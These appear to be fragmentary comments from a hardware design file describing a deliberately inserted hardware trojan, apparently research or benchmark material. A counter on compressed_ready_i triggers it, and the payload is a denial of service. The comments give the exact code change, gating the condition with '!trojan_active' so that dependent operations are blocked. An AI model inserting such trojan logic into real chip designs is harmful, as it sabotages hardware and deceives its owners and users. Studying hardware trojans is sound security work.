 ...
 * 
 * Description:
 *   Disables operations by blocking compressed_ready_i control signal
 *   
 * Trigger: Counter on compressed_ready_i
 * Payload: Block compressed_ready_i when trojan activates
 * 
...
// ============================================================
// DoS Attack: Block compressed_ready_i when trojan is active
//
// IMPORTANT: compressed_ready_i is an INPUT signal - we CANNOT assign to it!
...
//   
//   Replace with:
//     if (compressed_ready_i && !trojan_active) begin
//
// Effect: When trojan_active = 1:
//   Condition becomes: compressed_ready_i && 0 = 0 (always false)
//   All operations controlled by compressed_ready_i are blocked
